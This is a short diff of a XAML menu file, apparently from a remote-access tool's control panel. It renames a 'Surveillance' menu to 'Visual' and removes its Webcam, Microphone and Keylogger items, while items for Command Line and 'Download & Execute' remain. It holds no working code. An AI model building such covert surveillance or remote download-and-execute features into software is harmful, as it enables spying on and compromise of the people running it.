@@ -45,11 +45,8 @@
                         <MenuItem Header="Process Manager" Name="procmgr" Click="procmgr_Click" />
                         <MenuItem Header="Command Line" Name="cmdline" Click="cmdline_Click"/>
                     </MenuItem>
-                    <MenuItem Header="Surveillance" >
+                    <MenuItem Header="Visual" >
                         <MenuItem Header="Desktop" Name="desktopclick" Click="desktopclick_Click"/>
-                        <MenuItem Header="Webcam" />
-                        <MenuItem Header="Microphone" />
-                        <MenuItem Header="Keylogger" />
                     </MenuItem>
                     <MenuItem Header="Networking">
                         <MenuItem Header="Download &amp; Execute" Name="sendFile" Click="sendFile_Click"/>
